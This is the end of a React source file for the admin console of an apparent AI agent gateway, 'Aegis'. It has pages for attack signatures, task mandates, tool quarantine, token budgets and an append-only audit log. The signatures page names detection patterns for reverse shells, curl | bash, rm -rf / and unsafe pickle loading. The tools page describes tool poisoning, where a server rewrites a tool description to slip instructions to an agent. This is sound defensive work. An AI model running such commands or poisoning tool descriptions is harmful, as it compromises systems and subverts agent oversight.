        <p>{t("A fingerprint of an attack that is already known: a CVE, a public exploit, a technique seen in real incidents. Like an antivirus database, it does not need to understand the text, it recognises the pattern. Signatures come from a separate feed file (feeds/attacks.yaml, or a threat-intel URL), so the security team can update them without touching the policy or the code.")}</p>
      </div>
      <ul className="explain-kinds">
        <li><b>{t("Text patterns")}</b><span>{t("Reverse shells, curl | bash, rm -rf /, pickle.loads, trust_remote_code: checked in prompts, tool arguments, tool results and model answers.")}</span></li>
        <li><b>{t("File scans")}</b><span>{t("Model files are scanned opcode by opcode for pickles that import os or subprocess. The file is never loaded.")}</span></li>
        <li><b>{t("Components and sources")}</b><span>{t("Package versions with known CVEs, poisoned chat templates, models from typosquatted hosts, MCP tools changed after approval.")}</span></li>
      </ul>
    </section>
    <div className="two-col wide-left">
      {notice}
      <Section title={t("{n} signatures", { n: f.signatures.length })} aside={<span className="muted">{t("feed")} <Id>{f.version}</Id> {t("from")} <Id>{f.source.split("/").slice(-2).join("/")}</Id></span>}>
        <ul className="sig-list">
          {f.signatures.map((s) => (
            <li key={s.id} className={s.enabled ? "" : "is-off"}>
              <label className="toggle small"><input type="checkbox" aria-label={s.id} checked={s.enabled} onChange={(e) => save({ ...s, enabled: e.target.checked })} /><span aria-hidden="true" /></label>
              <div>
                <h3>{s.title}</h3>
                <p><Id>{s.id}</Id> <span className={`sev sev-${s.severity}`}>{t(s.severity)}</span> <span className="muted">{s.match.map((m) => human(m.type)).join(", ")}{s.refs.length ? `; ${s.refs.join(", ")}` : ""}</span></p>
              </div>
              <span className="sig-actions">
                {SIG_EXAMPLES[s.id] ? <button className="btn small" onClick={() => tryIt(s.id)}>{t("Try it")}</button>
                  : <span className="muted small">{t("checked when a model or tool is registered")}</span>}
                <button className="btn small quiet" onClick={() => run(() => api(`/admin/signatures/${s.id}`, { method: "DELETE" }), t("{id} removed", { id: s.id })).then(reload)}>{t("Remove")}</button>
              </span>
              {tried?.id === s.id && <div className="sig-try"><span className="label">{t("Example")}</span><pre className="excerpt">{SIG_EXAMPLES[s.id].text}</pre><Verdict res={tried.res} /></div>}
            </li>
          ))}
        </ul>
      </Section>
      <form className="sheet form" onSubmit={add}>
        <h2>{t("Add a pattern")}</h2>
        <label className="field"><span>{t("Signature ID")}</span><input value={form.id} onChange={(e) => setForm({ ...form, id: e.target.value })} /></label>
        <label className="field"><span>{t("What it catches")}</span><input value={form.title} placeholder={t("e.g. Requests to wire funds")} onChange={(e) => setForm({ ...form, title: e.target.value })} /></label>
        <label className="field"><span>{t("Regular expression, case-insensitive")}</span><input className="mono-input" value={form.pattern} onChange={(e) => setForm({ ...form, pattern: e.target.value })} /></label>
        <label className="field"><span>{t("Severity")}</span><select value={form.severity} onChange={(e) => setForm({ ...form, severity: e.target.value })}>{["low", "medium", "high", "critical"].map((x) => <option key={x} value={x}>{t(x)}</option>)}</select></label>
        <label className="field"><span>{t("Sample text to try it on")}</span><textarea rows={3} value={sample} onChange={(e) => setSample(e.target.value)} /></label>
        <div className="actions">
          <button className="btn" type="button" disabled={!form.pattern} onClick={async () => setTest(await api("/admin/signatures/test", { method: "POST", body: { pattern: form.pattern, text: sample, flags: "i" } }))}>{t("Try it")}</button>
          <button className="btn btn-primary" type="submit" disabled={!form.pattern}>{t("Add to feed")}</button>
        </div>
        {test && <p className={test.valid && test.matches.length ? "t-block" : "muted"}>{!test.valid ? test.error : test.matches.length ? t("Matches: {list}", { list: test.matches.join(", ") }) : t("No match in the sample.")}</p>}
      </form>
    </div>
    </>
  );
}

// ------------------------------------------------------------------ tasks

function Tasks() {
  const [list] = usePoll(() => api("/admin/tasks"), 3000);
  const [sel, setSel] = useState(null);
  const [detail, reloadDetail] = usePoll(() => (sel ? api(`/admin/tasks/${sel}`) : Promise.resolve(null)), sel ? 3000 : 0, [sel]);
  const [run, notice] = useAction();
  return (
    <div className="two-col tasks">
      {notice}
      <Section title={t("Tasks and their mandates")}>
        {list?.length ? (
          <table className="rows">
            <thead><tr><th>{t("Task")}</th><th>{t("For")}</th><th>{t("Data seen")}</th><th>{t("Status")}</th><th className="r">{t("Calls")}</th></tr></thead>
            <tbody>{list.map((x) => (
              <tr key={x.task_id} tabIndex={0} className={sel === x.task_id ? "is-sel" : ""} onClick={() => setSel(x.task_id)} onKeyDown={(e) => e.key === "Enter" && setSel(x.task_id)}>
                <td><Id>{x.task_id}</Id>{x.parent_id && <div className="muted small">{t("delegated by {id}", { id: x.parent_id })}</div>}</td>
                <td>{x.principal}<div className="muted small">{human(x.profile)}, {t("agent")} {x.agent_id}</div></td>
                <td><Level v={x.classification} /></td>
                <td className={`status status-${x.status}`}>{t(x.status)}</td>
                <td className="r">{t("{a} of {b}", { a: x.budget.calls_used, b: x.budget.calls_limit })}</td>
              </tr>
            ))}</tbody>
          </table>
        ) : <Empty>{t("No tasks yet. Run a scenario or create one through the API.")}</Empty>}
      </Section>
      <div>
        {detail ? (
          <article className="sheet task">
            <header>
              <div><h2><Id>{detail.task_id}</Id></h2><p className="muted">{detail.principal}, {human(detail.profile)}</p></div>
              {detail.status === "active"
                ? <button className="btn btn-danger" onClick={() => run(() => api(`/admin/tasks/${detail.task_id}/revoke`, { method: "POST" }), t("Mandate revoked. Its lease no longer works.")).then(reloadDetail)}>{t("Revoke mandate")}</button>
                : <span className={`status status-${detail.status}`}>{t(detail.status)}</span>}
            </header>
            <dl className="facts">
              <dt>{t("Most sensitive data read")}</dt><dd><Level v={detail.classification} /></dd>
              <dt>{t("May read")}</dt><dd>{detail.mandate.resources.map((r) => <Id key={r}>{r}</Id>)}</dd>
              <dt>{t("May use")}</dt><dd>{detail.mandate.tools.join(", ") || t("nothing")}</dd>
              <dt>{t("May write to")}</dt><dd>{(detail.mandate.recipients_allow || []).join(", ") || t("no e-mail recipients")}</dd>
              {detail.budget && <><dt>{t("Tokens")}</dt><dd>{t("{a} spent of {b}", { a: num(detail.budget.spent), b: num(detail.budget.token_limit) })}</dd></>}
              <dt>{t("Expires")}</dt><dd>{clock(detail.expires_at)}</dd>
            </dl>
            <h3 className="sub">{t("What happened")}</h3>
            <ol className="trail">
              {detail.events.map((e) => (
                <li key={e.id} className={e.action ? `trail-${e.action.toLowerCase()}` : "trail-sys"}>
                  <time>{clock(e.ts)}</time>
                  <div>
                    {e.action ? <><Mark a={e.action} /> {t(e.channel)} <Id>{e.target}</Id></> : <span className="sys">{human(e.kind)}</span>}
                    {e.rule_id && <div className="small">{t("by")} <Id>{e.rule_id}</Id> {human(e.reason_code)}</div>}
                    {e.evidence?.taint && <div className="small taint">{t("Read {label} data; the task is now {now}.", { label: lvl(e.evidence.taint.label), now: lvl(e.evidence.taint.task_now) })}</div>}
                    {e.kind === "DECISION" && <div className="small muted">{e.tool_invoked ? t("Tool ran") : t("Tool not called")}, {num(e.latency_ms, 1)} ms</div>}
                  </div>
                </li>
              ))}
            </ol>
          </article>
        ) : <Empty>{t("Select a task to see its mandate and every decision made for it.")}</Empty>}
      </div>
    </div>
  );
}

// ------------------------------------------------------------------ tools

function Tools() {
  const [list, reload] = usePoll(() => api("/admin/tools"), 4000);
  const [run, notice] = useAction();
  return (
    <div>
      {notice}
      <section className="card explain">
        <div>
          <h2>{t("What are tools here?")}</h2>
          <p>{t("Tools are what an agent can do in the world: read a document, search, send an e-mail, post to a URL, run code. They live behind MCP servers or APIs. The agent never calls them directly: only the gateway holds the secret the tool service accepts, so every call must pass the checks first.")}</p>
        </div>
        <div className="flow" aria-hidden="true">
          <span className="flow-box">{t("Agent")}</span><span className="flow-arrow">→</span>
          <span className="flow-box flow-aegis">Aegis<small>{t("pass, content, data flow, budget")}</small></span><span className="flow-arrow">→</span>
          <span className="flow-col">
            <span className="flow-box">{t("Tool service")}<small>doc.read, mail.send, http.post…</small></span>
            <span className="flow-box flow-sbx">{t("Sandbox")}<small>{t("only code.run: a throw-away container, no network")}</small></span>
          </span>
        </div>
        <p className="note">{t("This page guards against a different trick: tool poisoning. A server can silently change a tool's description to slip instructions to the agent. Each definition is pinned by its hash when first seen; if it changes, the tool is hidden and refused until someone approves the new text.")}</p>
      </section>
      <ul className="tool-list">
        {(list || []).map((x) => (
          <li key={x.name} className={x.status === "approved" ? "" : "is-quarantined"}>
            <div className="tool-head">
              <h3><Id>{x.name}</Id></h3>
              <span className={`status status-${x.status}`}>{x.status === "approved" ? t("Approved") : t("Quarantined")}</span>
              <span className="muted small">{t("pinned")} <Id>{x.hash}</Id></span>
              {x.status === "approved"
                ? <button className="btn small quiet" onClick={() => run(() => api(`/admin/tools/${x.name}/quarantine`, { method: "POST" }), t("{id} quarantined", { id: x.name })).then(reload)}>{t("Quarantine")}</button>
                : <button className="btn small btn-primary" onClick={() => run(() => api(`/admin/tools/${x.name}/approve`, { method: "POST" }), t("{id} approved with its current definition", { id: x.name })).then(reload)}>{t("Approve current text")}</button>}
            </div>
            <p className="tool-desc">{x.description}</p>
            {x.pending_description && <div className="diff"><span>{t("Changed to")}</span><p>{x.pending_description}</p></div>}
          </li>
        ))}
      </ul>
      <div className="actions">
        <button className="btn" onClick={() => run(() => api("/admin/backend/poison/legal_db.search", { method: "POST", body: {} }), t("The tool server changed a description. Watch it get quarantined.")).then(() => setTimeout(reload, 300))}>{t("Simulate a silent change on the server")}</button>
        <button className="btn quiet" onClick={() => run(() => api("/admin/backend/reset", { method: "POST" }), t("Tool server restored to its original definitions")).then(reload)}>{t("Restore the server")}</button>
      </div>
    </div>
  );
}

// ------------------------------------------------------------------ budget

function Budget() {
  const [n, setN] = useState(30);
  const [pool, setPool] = useState(10000);
  const [maxT, setMaxT] = useState(1000);
  const [res, setRes] = useState(null);
  const [busy, setBusy] = useState(false);
  const [rows, reload] = usePoll(() => api("/admin/budgets"), 4000);
  const [held] = usePoll(() => api("/admin/reservations?status=uncertain"), 5000);
  const [run, notice] = useAction();
  const go = async (e) => {
    e.preventDefault();
    setBusy(true); setRes(null);
    const r = await run(() => api(`/admin/simulate/agents?n=${n}&pool_tokens=${pool}&max_tokens=${maxT}`, { method: "POST" }), t("Race finished"));
    setBusy(false);
    if (r) { setRes(r); reload(); markDone("budget"); }
  };
  const fit = Math.min(n, Math.floor(pool / Math.max(1, maxT + 2)));  // + the test prompt, about 2 tokens
  const named = (rows || []).filter((r) => !r.scope_id.startsWith("task:") && !r.scope_id.startsWith("principal:sim_"));
  return (
    <div className="budget">
      {notice}
      <section className="card how">
        <h2>{t("How a request pays")}</h2>
        <ol className="how-steps">
          <li><b>{t("1. Reserve")}</b><span>{t("Before the model is called, the gateway reserves the request's maximum cost (prompt + max_tokens) in every budget it belongs to: the task, the user and the whole gateway. One atomic database update; if any of them has no room, the request gets 429 and the model is never called.")}</span></li>
          <li><b>{t("2. Run")}</b><span>{t("Only a request holding a reservation is sent to the model or tool.")}</span></li>
          <li><b>{t("3. Settle")}</b><span>{t("The real usage is charged and the unused part of the reservation goes back to the pool.")}</span></li>
        </ol>
        <p className="note">{t("Why not just check “is there room?” first: thirty agents asking at the same moment would all see room and all spend. Reserving first makes that impossible.")}</p>
      </section>

      <div className="two-col">
        <form className="sheet form" onSubmit={go}>
          <h2>{t("Race for one budget")}</h2>
          <p className="muted">{t("Agents start at the same moment and share a single pool. Each request reserves its maximum cost before the model is called.")}</p>
          <div className="inline-fields">
            <label className="field"><span>{t("Agents")}</span><input type="number" min="1" max="500" value={n} onChange={(e) => setN(+e.target.value)} /><small>{t("how many start at once")}</small></label>
            <label className="field"><span>{t("Pool, tokens")}</span><input type="number" min="1" value={pool} onChange={(e) => setPool(+e.target.value)} /><small>{t("shared budget")}</small></label>
            <label className="field"><span>{t("Per request")}</span><input type="number" min="1" value={maxT} onChange={(e) => setMaxT(+e.target.value)} /><small>{t("max_tokens of each")}</small></label>
          </div>
          <p className="predict">{t("Each agent reserves its prompt (about 2 tokens) plus max_tokens. With these numbers {fit} of {n} agents fit in the pool at once. The rest must be stopped before calling the model, and the pool must never go below zero.", { fit, n })}</p>
          <button className="btn btn-primary btn-lg" disabled={busy}>{busy ? t("Racing…") : t("Start {n} agents", { n })}</button>
          <p className="note">{t("Uses the mock model and a throwaway user, so it does not touch real budgets or latency figures.")}</p>
        </form>
        <div>
          {res ? <article className="certificate compact"><RaceView res={res} /></article> : (
            <div className="placeholder"><Rosette size={64} /><p>{t("Start the race. Each dot will be one agent: green got its tokens, red was stopped before calling the model.")}</p></div>
          )}
        </div>
      </div>

      <Section title={t("Budgets in force")} aside={<span className="muted">{t("set in the policy file, section budgets")}</span>}>
        <table className="rows">
          <thead><tr><th>{t("Scope")}</th><th>{t("Used")}</th><th className="r">{t("Spent")}</th><th className="r">{t("Held")}</th><th className="r">{t("Limit")}</th></tr></thead>
          <tbody>{named.map((r) => (
            <tr key={r.scope_id}><td><Id>{r.scope_id}</Id></td><td><Meter value={r.spent} reserved={r.reserved} limit={r.token_limit} /></td>
              <td className="r">{num(r.spent)}</td><td className="r">{num(r.reserved)}</td><td className="r">{num(r.token_limit)}</td></tr>
          ))}</tbody>
        </table>
      </Section>
      {held?.length > 0 && (
        <Section title={t("Waiting for reconciliation")}>
          <p className="note">{t("The provider did not confirm these calls, so their tokens stay reserved.")}</p>
          <ul className="plain">{held.map((r) => (
            <li key={r.id}><Id>{r.id.slice(0, 10)}</Id> {t("{n} tokens for", { n: r.amount })} <Id>{r.task_id}</Id>
              <button className="btn small" onClick={() => run(() => api(`/admin/reservations/${r.id}/settle`, { method: "POST", body: { actual_tokens: 0 } }), t("Reservation released"))}>{t("Release")}</button></li>
          ))}</ul>
        </Section>
      )}
    </div>
  );
}

// ------------------------------------------------------------------ audit

const KINDS = ["DECISION", "POLICY_CHANGED", "POLICY_REJECTED", "FEED_CHANGED", "TASK_CREATED", "TASK_DELEGATED", "TASK_REVOKED", "TOOL_APPROVED", "SIMULATION_RUN"];

function Audit() {
  const [filters, setFilters] = useState({ action: "", rule: "", kind: "" });
  const q = new URLSearchParams(Object.entries(filters).filter(([, v]) => v)).toString();
  const [rows] = usePoll(() => api(`/admin/audit?limit=300&${q}`), 4000, [q]);
  const [open, setOpen] = useState(null);
  return (
    <div>
      <div className="filters">
        <label className="field"><span>{t("Decision")}</span><select value={filters.action} onChange={(e) => setFilters({ ...filters, action: e.target.value })}><option value="">{t("Any")}</option>{Object.entries(WORD).map(([k, v]) => <option key={k} value={k}>{t(v)}</option>)}</select></label>
        <label className="field"><span>{t("Rule")}</span><input value={filters.rule} placeholder="IFC-001" onChange={(e) => setFilters({ ...filters, rule: e.target.value })} /></label>
        <label className="field"><span>{t("Event")}</span><select value={filters.kind} onChange={(e) => setFilters({ ...filters, kind: e.target.value })}><option value="">{t("Any")}</option>{KINDS.map((k) => <option key={k} value={k}>{human(k)}</option>)}</select></label>
        <span className="actions push">
          <button className="btn" onClick={() => download("/admin/audit/export?format=jsonl", "aegis-audit.jsonl")}>{t("Download JSONL")}</button>
          <button className="btn" onClick={() => download("/admin/audit/export?format=csv", "aegis-audit.csv")}>{t("Download CSV")}</button>
        </span>
      </div>
      <p className="note">{t("Entries can only be added. The database rejects edits and deletions, and evidence never contains the raw text that was checked.")}</p>
      <table className="rows audit">
        <thead><tr><th className="r">#</th><th>{t("Time")}</th><th>{t("Event")}</th><th>{t("Where")}</th><th>{t("Rule")}</th><th>{t("Task")}</th><th>{t("Policy")}</th></tr></thead>
        <tbody>{(rows || []).map((r) => (
          <React.Fragment key={r.id}>
            <tr tabIndex={0} className={open === r.id ? "is-sel" : ""} onClick={() => setOpen(open === r.id ? null : r.id)} onKeyDown={(e) => e.key === "Enter" && setOpen(open === r.id ? null : r.id)}>
              <td className="r muted">{r.id}</td><td>{clock(r.ts)}</td>
              <td>{r.action ? <Mark a={r.action} /> : <span className="sys">{human(r.kind)}</span>}</td>
              <td className="clip">{r.channel && t(r.channel)} {r.target}</td><td><Id>{r.rule_id}</Id></td><td><Id>{r.task_id}</Id></td><td className="muted small">{r.policy_version}</td>
            </tr>
            {open === r.id && <tr className="evidence"><td colSpan={7}><pre>{JSON.stringify(r.evidence, null, 2)}</pre></td></tr>}
          </React.Fragment>
        ))}</tbody>
      </table>
    </div>
  );
}

// ------------------------------------------------------------------ shell

function SideStatus({ stats, health }) {
  const ok = health?.status === "ok";
  return (
    <div className="side-status">
      <div className={`side-health ${health ? (ok ? "is-ok" : "is-bad") : ""}`}>
        <span className="dot" />{health ? (ok ? t("Gateway healthy") : t("Gateway degraded")) : t("Connecting")}
      </div>
      {stats && (
        <dl>
          <dt>{t("Policy")}</dt><dd><code>{stats.policy.version}</code></dd>
          <dt>{t("Profile")}</dt><dd>{t(stats.policy.profile)}</dd>
          <dt>{t("AI review")}</dt><dd title={stats.llm.model}>{stats.semantic.backend === "main" ? stats.llm.model.replace("main/", "").split("/").pop() : t("local scorer")}</dd>
          <dt>{t("Signatures")}</dt><dd>{stats.feed.signatures}</dd>
        </dl>
      )}
      {stats?.llm.configured && stats.llm.server?.includes("openrouter.ai") && <p className="side-alert">{t("Test mode: prompts go to OpenRouter (cloud)")}</p>}
      {stats?.semantic.override && <p className="side-alert">{t("AI review forced to “safe” (demo)")}</p>}
    </div>
  );
}

function Sidebar({ view, go, open, close, stats, health, lang, switchLang }) {
  const [key, setK] = useState(getKey());
  const [showKey, setShowKey] = useState(false);
  const off = stats?.policy.disabled_controls.length || 0;
  const badge = { controls: off ? { n: t("{n} off", { n: off }), bad: true } : null };
  return (
    <aside className={`side ${open ? "is-open" : ""}`} aria-label={t("Sections")}>
      <div className="side-brand">
        <Rosette size={34} />
        <div><span className="wordmark">Aegis</span><span className="side-tag">{t("AI control layer")}</span></div>
        <button className="side-close" onClick={close} aria-label={t("Close menu")}><Icon name="close" /></button>
      </div>
      <nav className="side-nav">
        {NAV.map((g) => (
          <div className="side-group" key={g.group}>
            <span className="side-label">{t(g.group)}</span>
            {g.items.map(([id, label]) => (
              <button key={id} aria-current={view === id ? "page" : undefined} className={`side-link ${view === id ? "is-on" : ""}`} onClick={() => { go(id); close(); }}>
                <Icon name={id} />
                <span>{t(label)}</span>
                {id === "live" && <span className="live-dot" aria-hidden="true" />}
                {badge[id] && <span className={`side-badge ${badge[id].bad ? "is-bad" : ""}`}>{badge[id].n}</span>}
              </button>
            ))}
          </div>
        ))}
      </nav>
      <div className="side-foot">
        <SideStatus stats={stats} health={health} />
        <div className="side-tools">
          <div className="lang" role="radiogroup" aria-label={t("Language")}>
            {["pl", "en"].map((l) => <button key={l} role="radio" aria-checked={lang === l} className={lang === l ? "is-on" : ""} onClick={() => switchLang(l)}>{l.toUpperCase()}</button>)}
          </div>
          <button className="side-key" onClick={() => setShowKey(!showKey)}><Icon name="key" size={16} />{t("Admin key")}</button>
        </div>
        {showKey && <input className="side-key-input" type="password" aria-label={t("Admin key")} value={key} onChange={(e) => { setK(e.target.value); setKey(e.target.value); }} />}
      </div>
      <Rosette size={340} className="side-art" />
    </aside>
  );
}

export default function App() {
  const [view, setView] = useState(() => (TITLES[location.hash.slice(1)] ? location.hash.slice(1) : "start"));
  const [lang, setL] = useState(getLang());
  const [menu, setMenu] = useState(false);
  const [stats] = usePoll(() => api("/admin/stats"), 4000);
  const [health] = usePoll(() => fetch("/health").then((r) => r.json()), 5000);
  useEffect(() => { location.hash = view; window.scrollTo(0, 0); }, [view]);
  useEffect(() => {
    const h = () => { const v = location.hash.slice(1); if (TITLES[v]) setView(v); };
    window.addEventListener("hashchange", h);
    return () => window.removeEventListener("hashchange", h);
  }, []);
  useEffect(() => { document.title = `${t(TITLES[view])} | Aegis`; }, [view, lang]);
  const switchLang = (l) => { setLang(l); setL(l); };
  const Views = { start: Start, agent: Agent, live: Live, scenarios: Scenarios, playground: Playground, controls: Controls, policy: Policy, signatures: Signatures, tasks: Tasks, tools: Tools, budget: Budget, audit: Audit };
  const View = Views[view] || Start;
  const info = PAGE_INFO[view];
  return (
    <div className="layout" key={lang}>
      <Sidebar view={view} go={setView} open={menu} close={() => setMenu(false)} stats={stats} health={health} lang={lang} switchLang={switchLang} />
      {menu && <div className="scrim" onClick={() => setMenu(false)} />}
      <div className="content">
        <header className="mobile-top">
          <button className="menu-btn" onClick={() => setMenu(true)} aria-label={t("Open menu")}><Icon name="menu" /></button>
          <Rosette size={26} /><span className="wordmark">Aegis</span>
        </header>
        <DisabledBanner />
        <main>
          {view !== "start" && (
            <header className="page-head">
              <p className="eyebrow"><Icon name={view} size={16} />{t(GROUP_OF[view])}</p>
              <h1>{t(TITLES[view])}</h1>
              {info && <p className="page-sub">{t(info.what)}</p>}
            </header>
          )}
          {view !== "start" && <PageHelp view={view} go={setView} />}
          <View key={view} go={setView} />
        </main>
      </div>
    </div>
  );
}
